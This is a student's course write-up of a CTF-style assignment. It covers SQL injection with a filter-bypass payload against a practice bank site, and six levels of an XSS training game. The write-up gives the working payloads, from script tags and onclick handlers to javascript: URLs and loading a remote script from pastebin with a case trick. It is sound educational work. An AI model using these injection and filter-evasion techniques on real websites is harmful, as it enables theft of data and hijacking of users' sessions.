# Crypto II Writeup

Name: Erin Schick
Section: 0101

I pledge on my honor that I have not given or received any unauthorized
assistance on this assignment or examination.

Digital acknowledgement: Erin Schick

## Assignment Writeup

### Part 1 (40 Pts)

So after looking at this question for a while I was very confused. But after some guessing and seeing the hint on piazza I realised that the first letters of the question spelled out SQL. This made me think that I had to use SQL injection to complete the question. Then after looking through the website when you clicked on the items they all had an extrension to the IRL of item?id=* which made me think that I could use this to find the flag.

When I tried something like: http://1337bank.money:5000/item?id=0'or'1=1 I got a "Error: attempted sql injection detected" on the page. I figured the result would have to be something like this so I kept on trying different combinations that basically say the same thing until I got the flag shown below. I used the URL http://1337bank.money:5000/item?id=1' || '1'='1  to get the flag that was on the bottom of the web page.

Whe flag was: CMSC389R-{y0u_ar3_th3_SQ1_ninj@}


### Part 2 (60 Pts)

Level 1:

I inserted <script>alert();</script> into the search bar on the website to advance to the next level. I knew to do this because I've done this before in another class.

Level 2:

I tried just doing the answer for the first level but that didn't work (it posted a blank post) so then I knew that they were removing the injection. So after going through the hints I figured out that you would have to integrate a button or something like that would trigger the alert and that is when my command "<button onclick="alert('hello world')">press</button>" worked.

Level 3:

Since there was no place to insert the information on the website like in a search bar or in a blog post like the levels before I knew I had to use the URL somehow to make the alert come up. I thought that I could somehow use the images on the website to trigger the alert because they were the only objects really on the screen. After looking at the hints and trying a lot of different combinations of the onclick syntax, I came across the result that worked which was added 'onclick='alert('hello')"; to the end of the website URL.

Level 4:

This level was hard... I had to look at the timer.html code and the three hints to see what I needed to do. I figured that I needed to put the injection in where the number of seconds had to go so I kept on playing with alert() syntax but then looked at line 21 in timer.html to really get to see where my code is going to see how I could best inject and alert. It was from there that I found the result which was: ')alert('hello world

Level 5:

Writing normal html scripts weren't working (were being escaped) so I wanted to find another way to input javascript into the URL. I knew I had to do something with the URL because of the hint on the webpage. I started to see the trend on the URL of "something?next=..." so then I thought to make the javascript the "next". This is when I got the result of adding: ?next=javascript:alert('hello world')  to the end of the URL which worked.

Level 6:

This was by far the hardest level. Somehow I wanted to "host" my own js file that would have the alert but I wasn't sure I would be able to do that so after doing a couple google searches I found out that I could use pastebin.com. From there, I created a post on pastebin.com that just said: alert('hello world');   and used the URL for the raw file after the "frame#" stuff in the URL. The URL for the pastebin post was https://pastebin.com/raw/jvz3jcuq therefore the final URL to make the alarm pop up ended in: frame#htTps://pastebin.com/raw/jvz3jcuq 

I had to capitalize one of the t's to make it valid because it wasn't showing the alert otherwise... I foudn this through research online. I knew that the file was inserted after the # so that is why I added the URL to the end like that.
